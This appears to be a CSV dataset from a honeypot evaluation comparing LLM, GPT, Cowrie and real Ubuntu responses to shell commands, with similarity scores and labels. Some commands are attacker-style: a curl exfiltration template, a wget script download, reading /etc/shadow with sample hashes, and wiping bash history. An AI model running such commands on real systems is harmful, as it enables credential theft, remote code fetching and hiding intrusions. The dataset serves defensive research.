Command,Response_LLM,Response_GPT,Response_Cowrie,Response_Ubuntu,CosineSimilarity_LLM-Ubuntu,CosineSimilarity_GPT-Ubuntu,CosineSimilarity_Cowrie-Ubuntu,echo_Ubuntu,LLM,GPT,Cowrie
curl -XPOST #{base64_data}.#{destination_url},"curl: option -X not recognized
curl: try 'curl --help' or 'curl --manual' for more information

"," curl: (3) Port number ended with 'x', Ci: No changes made to the system state. Current directory remains the same.  ","curl: option -X not recognized
curl: try 'curl --help' or 'curl --manual' for more information","curl: no URL specified!
curl: try 'curl --help' or 'curl --manual' for more information",0.912201688,0.252545308,0.898848548,2,FALC,FALNLC,FALC
wget http://192.168.32.7:1337/file.sh,"curl: (6) Could not resolve host: 192.168.32.7

",No response,curl: (6) Could not resolve host: 192.168.32.7,"--2025-01-01 08:56:52--  http://192.168.32.7:1337/file.sh
Connecting to 192.168.32.7:1337... failed: Connection refused.",0.324935714,0.0,0.456158628,4,FALNLC,FALNLC,FALNLC
sudo cat /etc/shadow > file,"root:$6$4aOmWdpJ$/kyPOik9rR0kSLyABIYNXgg/UqlWX3c1eIaovOLWphShTGXmuUAMq6iu9DrcQqlVUw3Pirizns4u27w3Ugvb6.:15800:0:99999:7:::
daemon:*:15800:0:99999:7:::
bin:*:15800:0:99999:7:::
sys:*:15800:0:99999:7:::
sync:*:15800:0:99999:7:::
games:*:15800:0:99999:7:::
man:*:15800:0:99999:7:::
lp:*:15800:0:99999:7:::
mail:*:15800:0:99999:7:::
news:*:15800:0:99999:7:::
uucp:*:15800:0:99999:7:::
proxy:*:15800:0:99999:7:::
www-data:*:15800:0:99999:7:::
backup:*:15800:0:99999:7:::
list:*:15800:0:99999:7:::
irc:*:15800:0:99999:7:::
gnats:*:15800:0:99999:7:::
nobody:*:15800:0:99999:7:::
libuuid:!:15800:0:99999:7:::
sshd:*:15800:0:99999:7:::
phil:$6$ErqInBoz$FibX212AFnHMvyZdWW87bq5Cm3214CoffqFuUyzz.ZKmZ725zKqSPRRlQ1fGGP02V/WawQWQrDda6YiKERNR61:15800:0:99999:7:::

", cat: /etc/shadow: Permission denied ,"root:$6$4aOmWdpJ$/kyPOik9rR0kSLyABIYNXgg/UqlWX3c1eIaovOLWphShTGXmuUAMq6iu9DrcQqlVUw3Pirizns4u27w3Ugvb6.:15800:0:99999:7:::
daemon:*:15800:0:99999:7:::
bin:*:15800:0:99999:7:::
sys:*:15800:0:99999:7:::
sync:*:15800:0:99999:7:::
games:*:15800:0:99999:7:::
man:*:15800:0:99999:7:::
lp:*:15800:0:99999:7:::
mail:*:15800:0:99999:7:::
news:*:15800:0:99999:7:::
uucp:*:15800:0:99999:7:::
proxy:*:15800:0:99999:7:::
www-data:*:15800:0:99999:7:::
backup:*:15800:0:99999:7:::
list:*:15800:0:99999:7:::
irc:*:15800:0:99999:7:::
gnats:*:15800:0:99999:7:::
nobody:*:15800:0:99999:7:::
libuuid:!:15800:0:99999:7:::
sshd:*:15800:0:99999:7:::
phil:$6$ErqInBoz$FibX212AFnHMvyZdWW87bq5Cm3214CoffqFuUyzz.ZKmZ725zKqSPRRlQ1fGGP02V/WawQWQrDda6YiKERNR61:15800:0:99999:7:::",,0.0,0.0,0.0,0,SALNLC,SALNLC,SALNLC
"echo â€œ"" > ~/.bash_history",#NAME?," 
Ci: Current directory remains the same. The command has cleared the user's bash history.
Fi: 1",,/bin/sh: 1: Syntax error: Unterminated quoted string,0.0,0.0,0.0,130,FALNLC,FALNLC,FALNLC
pwd,"/root

","plaintext
/home/username",/root,/home/user/test,0.0,0.184172168,0.0,0,SALNLC,SALNLC,SALNLC
cd ..; ls -al,"drwxr-xr-x 1 root root  4096 2013-04-05 12:03 .
drwxr-xr-x 1 root root  4096 2013-04-05 12:03 ..
drwxr-xr-x 1 root root  4096 2013-04-05 11:53 bin
drwxr-xr-x 1 root root  4096 2013-04-05 12:02 boot
drwxr-xr-x 1 root root  3060 2013-04-05 12:03 dev
drwxr-xr-x 1 root root  4096 2013-04-05 12:06 etc
drwxr-xr-x 1 root root  4096 2013-04-05 12:02 home
lrwxrwxrwx 1 root root    32 2013-04-05 11:53 initrd.img -> /boot/initrd.img-3.2.0-4-686-pae
drwxr-xr-x 1 root root  4096 2013-04-05 12:01 lib
drwx------ 1 root root 16384 2013-04-05 11:52 lost+found
drwxr-xr-x 1 root root  4096 2013-04-05 11:52 media
drwxr-xr-x 1 root root  4096 2013-04-05 11:52 mnt
drwxr-xr-x 1 root root  4096 2013-04-05 11:52 opt
dr-xr-xr-x 1 root root     0 2013-04-05 12:03 proc
drwx------ 1 root root  4096 2013-04-05 12:25 root
drwxr-xr-x 1 root root   380 2013-04-05 12:06 run
drwxr-xr-x 1 root root  4096 2013-04-05 12:03 sbin
drwxr-xr-x 1 root root  4096 2013-04-05 11:52 selinux
drwxr-xr-x 1 root root  4096 2013-04-05 11:52 srv
drwxr-xr-x 1 root root     0 2013-04-05 12:03 sys
-rwxr-xr-x 1 root root   500 2021-05-30 04:44 test2
drwxrwxrwt 1 root root  4096 2013-04-05 12:17 tmp
drwxr-xr-x 1 root root  4096 2013-04-05 11:52 usr
drwxr-xr-x 1 root root  4096 2013-04-05 11:52 var
lrwxrwxrwx 1 root root    28 2013-04-05 11:53 vmlinuz -> /boot/vmlinuz-3.2.0-4-686-pae

","total 12
drwxr-xr-x  3 username username 4096 Oct  1 12:00 .
drwxr-xr-x  5 username username 4096 Oct  1 12:00 ..
-rw-r--r--  1 username username    0 Oct  1 12:00 file","drwxr-xr-x 1 root root  4096 2013-04-05 08:03 .
drwxr-xr-x 1 root root  4096 2013-04-05 08:03 ..
drwxr-xr-x 1 root root  4096 2013-04-05 07:53 bin
drwxr-xr-x 1 root root  4096 2013-04-05 08:02 boot
drwxr-xr-x 1 root root  3060 2013-04-05 08:03 dev
drwxr-xr-x 1 root root  4096 2013-04-05 08:06 etc
drwxr-xr-x 1 root root  4096 2013-04-05 08:02 home
lrwxrwxrwx 1 root root    32 2013-04-05 07:53 initrd.img -> /boot/initrd.img-3.2.0-4-686-pae
drwxr-xr-x 1 root root  4096 2013-04-05 08:01 lib
drwx------ 1 root root 16384 2013-04-05 07:52 lost+found
drwxr-xr-x 1 root root  4096 2013-04-05 07:52 media
drwxr-xr-x 1 root root  4096 2013-04-05 07:52 mnt
drwxr-xr-x 1 root root  4096 2013-04-05 07:52 opt
dr-xr-xr-x 1 root root     0 2013-04-05 08:03 proc
drwx------ 1 root root  4096 2013-04-05 08:25 root
drwxr-xr-x 1 root root   380 2013-04-05 08:06 run
drwxr-xr-x 1 root root  4096 2013-04-05 08:03 sbin
drwxr-xr-x 1 root root  4096 2013-04-05 07:52 selinux
drwxr-xr-x 1 root root  4096 2013-04-05 07:52 srv
drwxr-xr-x 1 root root     0 2013-04-05 08:03 sys
-rwxr-xr-x 1 root root   500 2021-05-30 00:44 test2
drwxrwxrwt 1 root root  4096 2013-04-05 08:17 tmp
drwxr-xr-x 1 root root  4096 2013-04-05 07:52 usr
drwxr-xr-x 1 root root  4096 2013-04-05 07:52 var
lrwxrwxrwx 1 root root    28 2013-04-05 07:53 vmlinuz -> /boot/vmlinuz-3.2.0-4-686-pae","total 204
drwxr-xr-x 36 user user  4096 Jan  1 00:58 .
drwxr-xr-x  3 root  root   4096 Nov  7  2023 ..
drwxrwxr-x  7 user user  4096 Jun 10  2024 atldoan
-rw-------  1 user user 37272 Jan  1 08:56 .bash_history
-rw-r--r--  1 user user   220 Nov  7  2023 .bash_logout
-rw-r--r--  1 user user  3771 Nov  7  2023 .bashrc
drwxrwxr-x  3 user user  4096 Jun 10  2024 .bnd
drwx------ 21 user user  4096 Jan  1 00:59 .cache
drwx------ 17 user user  4096 Jan  1 01:08 .config
drwxr-xr-x  2 user user  4096 Jun  5  2024 Desktop
drwxrwxr-x  4 user user  4096 Apr 30  2024 doan
drwxr-xr-x  2 user user  4096 Nov  7  2023 Documents
drwxrwxr-x  3 user user  4096 Apr 29  2024 .dotnet
drwxr-xr-x  6 user user  4096 Jun 25  2024 Downloads
drwxrwxr-x  8 user user  4096 Jun  6  2024 .eclipse
drwxrwxr-x  3 user user  4096 Jun  5  2024 eclipse
drwxrwxr-x  3 user user  4096 Jun  5  2024 eclipse-inst-jre-linux64
drwxrwxr-x  5 user user  4096 Jun 10  2024 eclipse-workspace
drwx------  3 user user  4096 Nov  7  2023 .gnupg
drwxrwxr-x 10 user user  4096 Jun  5  2024 .gradle
drwxrwxr-x  3 user user  4096 May 20  2024 .ipython
drwxrwxr-x 15 user user  4096 Jun  5  2024 jadx-master
drwxrwxr-x  5 user user  4096 Jun  9  2024 java
drwxrwxr-x  2 user user  4096 Apr 29  2024 .keras
drwxr-xr-x  6 user user  4096 Jun 25  2024 .local
drwxrwxr-x  3 user user  4096 Jun  9  2024 .m2
drwx------  4 user user  4096 Nov  7  2023 .mozilla
drwxr-xr-x  2 user user  4096 Nov  7  2023 Music
drwxrwxr-x 22 user user  4096 Dec 10  2023 openssl-1.0.1a
drwxrwxr-x  6 user user  4096 Jun 10  2024 .p2
drwxr-xr-x  2 user user  4096 Jun  9  2024 Pictures
drwx------  3 user user  4096 Apr 29  2024 .pki
-rw-r--r--  1 user user   807 Nov  7  2023 .profile
drwxr-xr-x  2 user user  4096 Nov  7  2023 Public
-rw-------  1 user user     0 Apr 30  2024 .python_history
drwx------  3 user user  4096 Jun  5  2024 snap
-rw-r--r--  1 user user     0 Nov  7  2023 .sudo_as_admin_successful
drwxrwxr-x  2 user user  4096 Jun  6  2024 .swt
drwxr-xr-x  2 user user  4096 Nov  7  2023 Templates
drwxrwxr-x  3 user user  4096 Jan  1 08:56 test
drwxr-xr-x  2 user user  4096 Nov  7  2023 Videos
drwxrwxr-x  4 user user  4096 Apr 29  2024 .vscode
-rw-rw-r--  1 user user   417 May  2  2024 .wget-hsts",0.261665761,0.206465594,0.249422984,0,SALNLC,SALNLC,SALNLC
cp test1.txt test2.txt,"cp: cannot stat `test1.txt': No such file or directory

",No response,cp: cannot stat `test1.txt': No such file or directory,cp: cannot stat 'test1.txt': No such file or directory,1.0,0.067502869,1.0,1,FALC,FALNLC,FALC
mv test1.txt test2.txt,"mv: cannot stat `test1.txt': No such file or directory

", No response .9,mv: cannot stat `test1.txt': No such file or directory,mv: cannot stat 'test1.txt': No such file or directory,1.0,0.071503132,1.0,1,FALC,FALNLC,FALC
rm test.txt,"rm: cannot remove `test.txt': No such file or directory

",rm: cannot remove 'test.txt': No such file or directory,rm: cannot remove `test.txt': No such file or directory,rm: cannot remove 'test.txt': No such file or directory,1.0,1.0,1.0,1,FALC,FALC,FALC
cat test.txt,"cat: test.txt: No such file or directory

",cat: test.txt: No such file or directory,cat: test.txt: No such file or directory,cat: test.txt: No such file or directory,1.0,1.0,1.0,1,FALC,FALC,FALC
"grep ""pattern"" test.txt","grep: /root/test.txt: No such file or directory

",grep: test.txt: No such file or directory,grep: /root/test.txt: No such file or directory,grep: test.txt: No such file or directory,0.932311363,1.0,0.931150952,2,FALC,FALC,FALC
head test.txt,"head: cannot open `/root/test.txt' for reading: No such file or directory

",head: test.txt: No such file or directory,head: cannot open `/root/test.txt' for reading: No such file or directory,head: cannot open 'test.txt' for reading: No such file or directory,0.955623245,0.789606943,0.956281013,1,FALC,FALC,FALC
tail test.txt,"tail: cannot open `/root/test.txt' for reading: No such file or directory

",tail: test.txt: No such file or directory,tail: cannot open `/root/test.txt' for reading: No such file or directory,tail: cannot open 'test.txt' for reading: No such file or directory,0.957859085,0.792435015,0.956782899,1,FALC,FALC,FALC
nano test.txt,"E558: Terminal entry not found in terminfo

",No response,E558: Terminal entry not found in terminfo,Command timed out,0.0,0.0,0.0,Timeout,FALNLC,FALNLC,FALNLC
chmod permissions test.txt,"chmod: invalid mode: â€˜permissionsâ€™
Try 'chmod --help' for more information.

",chmod: permissions: No such file or directory ,"chmod: invalid mode: â€˜permissionsâ€™
Try 'chmod --help' for more information.","chmod: invalid mode: â€˜permissionsâ€™
Try 'chmod --help' for more information.",1.0,0.358367189,1.0,1,FALC,FALNLC,FALC
ps,"PID   TTY     TIME  COMMAND                     
6271  pts/0   0:00  -bash                        
6273  pts/0   0:00  ps                           

",PID TTY          TIME CMD,"PID   TTY     TIME  COMMAND
5933  pts/0   0:00  -bash","PID TTY          TIME CMD
 111389 pts/2    00:00:00 bash
 111397 pts/2    00:00:00 python3
 111445 pts/2    00:00:00 nano
 111477 pts/2    00:00:00 sh
 111478 pts/2    00:00:00 ps",0.563179394,0.161282277,0.42337044,0,SALNLC,SALNLC,SALNLC
top,"E82: Cannot allocate any buffer, exiting...

","top - 15:00:01 up  1:23,  2 users,  load average: 0.00, 0.01, 0.05
Tasks:  1 total,   0 running,   1 sleeping,   0 stopped,   0 zombie
%Cpu(s):  0.0 us,  0.0 sy,  0.0 ni,  100.0 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st
MiB Mem :   1000.0 total,    500.0 free,    300.0 used,    200.0 buff/cache
MiB Swap:    512.0 total,    512.0 free,      0.0 used.    600.0 avail Mem 

PID USER      PR  NI    VIRT    RES    SHR S  %CPU %MEM     TIME+ COMMAND","E82: Cannot allocate any buffer, exiting...",Command timed out,0.0,0.014795869,0.0,Timeout,FALNLC,FALNLC,FALNLC
ifconfig,"eth0      Link encap:Ethernet  HWaddr 8e:13:9d:6b:cd:8c
          inet addr:192.168.64.3  Bcast:192.168.64.255  Mask:255.255.255.0
          inet6 addr: fea6::f2:78ff:fe31:f201/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:428709 errors:0 dropped:0 overruns:0 frame:0
          TX packets:545679 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:236232843 (236.2 MB)  TX bytes:26733901 (26.7 MB)


lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:110 errors:0 dropped:0 overruns:0 frame:0
          TX packets:110 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:52761520 (52.8 MB)  TX bytes:52761520 (52.8 MB)

",ifconfig: command not found,"eth0      Link encap:Ethernet  HWaddr 5f:bd:11:f6:68:ea
inet addr:192.168.159.149  Bcast:192.168.159.255  Mask:255.255.255.0
inet6 addr: fe08::1fc:b9ff:fe9d:1e01/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:360718 errors:0 dropped:0 overruns:0 frame:0
TX packets:454669 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:1000
RX bytes:535386108 (535.4 MB)  TX bytes:42693769 (42.7 MB)


lo        Link encap:Local Loopback
inet addr:127.0.0.1  Mask:255.0.0.0
inet6 addr: ::1/128 Scope:Host
UP LOOPBACK RUNNING  MTU:65536  Metric:1
RX packets:110 errors:0 dropped:0 overruns:0 frame:0
TX packets:110 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:50084361 (50.1 MB)  TX bytes:50084361 (50.1 MB)",/bin/sh: 1: ifconfig: not found,0.0,0.872376155,0.0,127,FALNLC,FALC,FALNLC
